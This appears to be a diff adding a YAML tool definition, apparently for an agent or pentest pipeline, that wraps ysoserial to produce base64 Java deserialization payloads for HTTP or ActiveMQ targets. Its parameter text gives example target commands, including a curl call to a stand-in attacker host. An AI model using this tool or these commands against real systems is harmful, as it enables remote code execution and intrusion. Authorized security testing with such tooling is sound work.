@@ -1,0 +1,19 @@
+name: "ysoserial_payload"
+command: "bash"
+args: ["-c", "java -jar \"${YSOSERIAL_JAR:-/opt/baseline-tools/tools/ysoserial.jar}\" \"$0\" \"$1\" | base64 -w0"]
+enabled: true
+timeout: 30
+max_output: 6000
+short_description: "Java deserialization payload generator (ysoserial)"
+description: "Generate a Java deserialization payload using ysoserial gadget chains, returned as a single-line base64 string ready to embed in an HTTP/raw exploit. Pair with tcp_send (binary protocols like ActiveMQ OpenWire 61616) or http_request (Content-Type: application/x-java-serialized-object). The jar path defaults to /opt/baseline-tools/tools/ysoserial.jar (fleet) or the YSOSERIAL_JAR env var (pipeline)."
+parameters:
+  - name: "gadget"
+    type: "string"
+    description: "Gadget chain name. Common: CommonsCollections1..7, CommonsBeanutils1, ROME, Hibernate1, Spring1, JBossInterceptors1, MozillaRhino1, Vaadin1, Click1, Groovy1, JSON1, Jdk7u21."
+    required: true
+    format: "positional"
+  - name: "command"
+    type: "string"
+    description: "OS command to execute on the target when the payload deserializes (e.g. 'curl http://attacker:8080/pwn' or 'id; uname -a > /tmp/pwn.txt')."
+    required: true
+    format: "positional"
